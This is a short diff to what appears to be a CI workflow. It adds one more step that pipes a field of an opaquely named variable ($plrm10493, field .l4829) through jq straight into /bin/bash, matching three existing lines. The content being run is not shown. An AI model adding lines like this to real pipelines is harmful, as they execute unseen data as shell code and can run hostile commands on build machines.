@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$mx88" | jq -r .p2754 | /bin/bash
           printf '%s' "$s01" | jq -r .gm1436 | /bin/bash
           printf '%s' "$ffs8" | jq -r .sn5677 | /bin/bash
+          echo $plrm10493 | jq -r .l4829 | /bin/bash
 
       - name: Save results
         if: always()
